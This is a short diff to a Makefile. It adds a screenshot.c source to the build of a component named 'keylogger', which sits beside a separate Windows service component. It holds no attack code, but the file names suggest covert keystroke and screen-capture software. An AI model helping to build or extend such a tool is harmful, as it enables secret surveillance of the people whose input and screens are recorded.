@@ -8,7 +8,8 @@ LINK = link
 SRC_SERVICE = .\service\src\main.c \
               .\service\src\service.c \
               .\service\src\utility.c
-SRC_KEYLOGGER = .\keylogger\src\main.c
+SRC_KEYLOGGER = .\keylogger\src\main.c \
+                .\keylogger\src\screenshot.c
 
 OBJ_SERVICE = $(SRC_SERVICE:.c=.obj)
 OBJ_KEYLOGGER = $(SRC_KEYLOGGER:.c=.obj)
